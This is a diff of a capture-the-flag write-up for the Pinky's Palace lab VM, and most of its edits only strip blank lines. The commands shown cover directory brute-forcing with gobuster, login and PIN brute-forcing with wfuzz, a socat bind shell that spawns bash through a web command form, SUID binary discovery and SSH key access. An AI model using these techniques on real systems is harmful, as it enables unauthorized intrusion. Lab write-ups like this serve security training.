@@ -1165,84 +1165,48 @@ Heading over to the database website we gobuster a bunch of different lists, unt
 root@kali: gobuster dir -w /usr/share/sqlmap/data/txt/common-tables.txt -u http://192.168.1.148:8002 -x sql,bak,db,zip,tar,tar.gz
 
 ===============================================================
-
 Gobuster v3.0.1
 
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
-
 ===============================================================
-
 [+] Url:            http://192.168.1.148:8002
-
 [+] Threads:        10
-
 [+] Wordlist:       /usr/share/sqlmap/data/txt/common-tables.txt
-
 [+] Status codes:   200,204,301,302,307,401,403
-
 [+] User Agent:     gobuster/3.0.1
-
 [+] Extensions:     bak,db,zip,tar,tar.gz,sql
-
 [+] Timeout:        10s
-
 ===============================================================
-
 2020/02/03 18:37:54 Starting gobuster
-
 ===============================================================
-
 /pwds.db (Status: 200)
-
 ===============================================================
-
 2020/02/03 18:37:56 Finished
-
 ===============================================================
-
 ```
 
 
 Browsing to /pwds/db we get a list of what looks like potential passwords:
 
 ```
-
 FJ(J#J(R#J
-
 JIOJoiejwo
-
 JF()#)PJWEOFJ
-
 Jewjfwej
-
 jvmr9e
-
 uje9fu
-
 wjffkowko
-
 ewufweju
-
 pinkyspass
-
 consoleadmin
-
 administrator
-
 admin
-
 P1nK135Pass
-
 AaPinkSecaAdmin4467
-
 password4P1nky
-
 Bbpinksecadmin9987
-
 pinkysconsoleadmin
-
 pinksec133754
-
 ```
 
 
@@ -1251,19 +1215,12 @@ The closest thing we have to user names is the passwd file. Let’s grab those s
 ```
 
 root@kali: cat users.txt
-
 root
-
 pinky
-
 pinksec
-
 pinksecadmin
-
 pinkadmin
-
 dpink
-
 ```
 
 
@@ -1295,27 +1252,16 @@ Crunch will now generate the following amount of data: 600000 bytes
 Crunch will now generate the following number of lines: 100000 
 
 root@kali: head pins.txt 
-
 11111
-
 11112
-
 11113
-
 11114
-
 11115
-
 11116
-
 11117
-
 11118
-
 11119
-
 11110
-
 ```
 
 
@@ -1328,65 +1274,37 @@ Hydra is a touchy beast, so we start by trying wfuzz:
 
 root@kali: wfuzz -w users.txt -w pwds.txt -w pins.txt -c -d "user=FUZZ&pass=FUZ2Z&pin=FUZ3Z" http://192.168.1.148:8001/login.php
 
-
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 
-
 ********************************************************
-
 * Wfuzz 2.4 - The Web Fuzzer                           *
-
 ********************************************************
-
 
 Target: http://192.168.1.148:8001/login.php
-
 Total requests: 7200000
 
-
 ===================================================================
-
 ID           Response   Lines    Word     Chars       Payload                                                                                   
-
 ===================================================================
-
 
 000000009:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11119"                                                               
-
 000000010:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11110"                                                               
-
 000000001:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11111"                                                               
-
 000000002:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11112"                                                               
-
 000000003:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11113"                                                               
-
 000000004:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11114"                                                               
-
 000000005:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11115"                                                               
-
 000000006:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11116"                                                               
-
 000000007:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11117"                                                               
-
 000000008:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11118"                                                               
-
 000000011:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11121"                                                               
-
 000000012:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11122"                                                               
-
 000000013:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11123"                                                               
-
 000000014:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11124"                                                               
-
 000000015:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11125"                                                               
-
 000000016:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11126"                                                               
-
 000000017:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11127"                                                               
-
 000000018:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11128"
-
 ```
 
 
@@ -1399,36 +1317,21 @@ root@kali: wfuzz -t 250 --hh 45 -w users.txt -w pwds.txt -c -d "user=FUZZ&pass=F
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 
-
 ********************************************************
-
 * Wfuzz 2.4 - The Web Fuzzer                           *
-
 ********************************************************
-
 
 Target: http://192.168.1.148:8001/login.php
-
 Total requests: 126
 
-
 ===================================================================
-
 ID           Response   Lines    Word     Chars       Payload                                                                                   
-
 ===================================================================
-
 
 000000014:   200        0 L      6 W      41 Ch       "pinkadmin - AaPinkSecaAdmin4467"                                                      
-
-​
-
 Total time: 3.321621
-
 Processed Requests: 126
-
 Filtered Requests: 125
-
 Requests/sec.: 37.93327
 
 ```
@@ -1452,61 +1355,37 @@ We can now hard-code the username and password in and run wfuzz again with just 
 
 root@kali wfuzz -t 250 --hh 41 -w pins.txt -c -d "user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ" http://192.168.1.148:8001/login.php
 
-
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 
-
 ********************************************************
-
 * Wfuzz 2.4 - The Web Fuzzer                           *
-
 ********************************************************
-
 
 Target: http://192.168.1.148:8001/login.php
-
 Total requests: 100000
 
-
 ===================================================================
-
 ID           Response   Lines    Word     Chars       Payload                                                                                   
-
 ===================================================================
-
 
 000003771:   200        0 L      6 W      45 Ch       "14881"                                                                                   
-
 000003773:   200        0 L      6 W      45 Ch       "14883"                                                                                   
-
 000003780:   200        0 L      6 W      45 Ch       "14880"                                                                                   
-
 000003784:   200        0 L      6 W      45 Ch       "14894"                                                                                   
-
 000003785:   200        0 L      6 W      45 Ch       "14895"                                                                                   
-
 000003789:   200        0 L      6 W      45 Ch       "14899"                                                                                   
-
 000003791:   200        0 L      6 W      45 Ch       "14801"           
 
 ...
 
 000041673:   200        0 L      6 W      45 Ch       "52783"                                                                                   
-
 000044739:   302        0 L      0 W      0 Ch        "55849"                                                                                   
-
 000045811:   200        0 L      6 W      45 Ch       "56921"                                                                                   
-
 000045820:   200        0 L      6 W      45 Ch       "56920"                                                                                   
-
 000046128:   200        0 L      6 W      45 Ch       "57238"                                                                                   
-
 000046129:   200        0 L      6 W      45 Ch       "57239"                                                                                   
-
-000046130:   200        0 L      6 W      45 Ch       "57230"                                                                                   
-
+000046130:   200        0 L      6 W     45 Ch       "57230"                                                                                   
 000046133:   200        0 L      6 W      45 Ch       "57243"
-
 ...
 
 ```
@@ -1516,17 +1395,11 @@ And we get a redirect when we use the pin 55849. Time to head over to the site a
 
 We have a bash command input. We also know our socat bind shell works, so lets reuse that again and see if we have changed user contexts.
 ```
-
 Server - Web input form:
-
 socat TCP-LISTEN:1338,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
-
 Client (local attacking machine):
-
 socat FILE:`tty`,raw,echo=0 TCP:<server IP>:1338
-
 root@kali: socat FILE:`tty`,raw,echo=0 TCP:192.168.1.148:1338
-
 pinksec@pinkys-palace:/home/pinksec/html/PinkysC0n7r0lP4n31337$ 
 ```
 We are pinksec!
@@ -1534,37 +1407,21 @@ We are pinksec!
 Nothing in the web files to help us, but in the users home directory we do find an interesting binary:
 ```
 pinksec@pinkys-palace:/home/pinksec$ ls -la
-
 total 32
-
 drwx------ 5 pinksec pinksec 4096 May 14  2018 .
-
 drwxr-xr-x 5 root    root    4096 May 12  2018 ..
-
 lrwxrwxrwx 1 root    root       9 May 12  2018 .bash_history -> /dev/null
-
 -rw-r--r-- 1 pinksec pinksec  220 May 15  2017 .bash_logout
-
 -rw-r--r-- 1 pinksec pinksec 3526 May 15  2017 .bashrc
-
 -rw-r--r-- 1 pinksec pinksec  675 May 15  2017 .profile
-
 drwxr-xr-x 2 pinksec pinksec 4096 May 15  2018 bin
-
 drwxr-xr-x 2 pinksec pinksec 4096 May 12  2018 database
-
 drwxr-xr-x 3 pinksec pinksec 4096 May 12  2018 html
-
 pinksec@pinkys-palace:/home/pinksec$ ls -la bin
-
 total 16
-
 drwxr-xr-x 2 pinksec           pinksec           4096 May 15  2018 .
-
 drwx------ 5 pinksec           pinksec           4096 May 14  2018 ..
-
 -rwsr-xr-x 1 pinksecmanagement pinksecmanagement 7508 May 13  2018 pinksecd
-
 pinksec@pinkys-palace:/home/pinksec$ 
 ```
 
@@ -1572,21 +1429,13 @@ We notice specifically that this has the SUID bit set for a user and group that 
 
 ```
 pinksec@pinkys-palace:/home/pinksec/bin$ ./pinksecd 
-
 [+] PinkSec Daemon [+]
-
 Options: -d: daemonize, -h: help
-
 Soon to be host of pinksec web application.
-
 pinksec@pinkys-palace:/home/pinksec/bin$ ./pinksecd -h
-
 [+] PinkSec Daemon [+]
-
 Options: -d: daemonize, -h: help
-
 Flags Added: -h
-
 Soon to be host of pinksec web application.
 ```
 
@@ -1929,27 +1778,16 @@ Attempting to upgrade our shell to /bin/bash we get an interesting error:
 
 ```
 $ python -c 'import pty; pty.spawn("/bin/bash")'
-
 Traceback (most recent call last):
-
   File "<string>", line 1, in <module>
-
   File "/usr/lib/python2.7/pty.py", line 165, in spawn
-
     pid, master_fd = fork()
-
   File "/usr/lib/python2.7/pty.py", line 107, in fork
-
     master_fd, slave_fd = openpty()
-
   File "/usr/lib/python2.7/pty.py", line 29, in openpty
-
     master_fd, slave_name = _open_terminal()
-
   File "/usr/lib/python2.7/pty.py", line 70, in _open_terminal
-
     raise os.error, 'out of pty devices'
-
 OSError: out of pty devices
 
 ```
@@ -1958,45 +1796,25 @@ But looking at the passwd file when the user pinksecmanagement logs in, they get
 
 We haven’t touched SSH yet, so let’s see if we can log in with just an SSH private key like we have on so many other boxes.
 ```
-
 root@kali: ssh-keygen -f thoseguys
-
 Generating public/private rsa key pair.
-
 Enter passphrase (empty for no passphrase): 
-
 Enter same passphrase again: 
-
 Your identification has been saved in thoseguys.
-
 Your public key has been saved in thoseguys.pub.
-
 The key fingerprint is:
-
 SHA256:FPcqsLsSubpzwhMDCqUXHxDCjX5STT8Qyt2GGmV8VxI root@kali
-
 The key's randomart image is:
-
 +---[RSA 3072]----+
-
 |o =o+*. .E+.     |
-
 | ++o*o=. +..     |
-
 |.o.* +o=o   .    |
-
 |+o..+ .+.  .     |
-
 |ooo. .. S .      |
-
 |. o o  . .       |
-
 | . o o.          |
-
 |  = +  .         |
-
 |  oB ..          |
-
 +----[SHA256]-----+
 ```
 
@@ -2014,19 +1832,12 @@ Now we can try logging in directly as pinksecmanagement:
 
 ```
 root@kali: ssh -i thoseguys -p 5555 pinksecmanagement@192.168.1.148
-
 Linux pinkys-palace 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686
-
 The programs included with the Debian GNU/Linux system are free software;
-
 the exact distribution terms for each program are described in the
-
 individual files in /usr/share/doc/*/copyright.
-
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-
 permitted by applicable law.
-
 pinksecmanagement@pinkys-palace:~$
 
 ```
@@ -2056,7 +1867,6 @@ Looking at the permissions on the file:
 
 ```
 pinksecmanagement@pinkys-palace:~$ ls -la /usr/local/bin/PSMCCLI
-
 -rwsrwx--- 1 pinky pinksecmanagement 7396 May 14  2018 /usr/local/bin/PSMCCLI
 ```
 
@@ -2064,13 +1874,9 @@ Running this binary looks like it just takes whatever argument we give it:
 
 ```
 pinksecmanagement@pinkys-palace:~$ PSMCCLI 
-
 [+] Pink Sec Management Console CLI
-
 pinksecmanagement@pinkys-palace:~$ PSMCCLI ThoseGuys
-
 [+] Args: ThoseGuys
-
 pinksecmanagement@pinkys-palace:~$ 
 ```
 
@@ -2078,7 +1884,6 @@ Time to reverse another binary. Let’s use SCP this time to get it on our local
 
 ```
 pinksecmanagement@pinkys-palace:~$ cp /usr/local/bin/PSMCCLI ~/
-
 
 root@kali: scp -i thoseguys -P 5555 pinksecmanagement@192.168.1.148:/home/pinksecmanagement/PSMCCLI ./
 ```
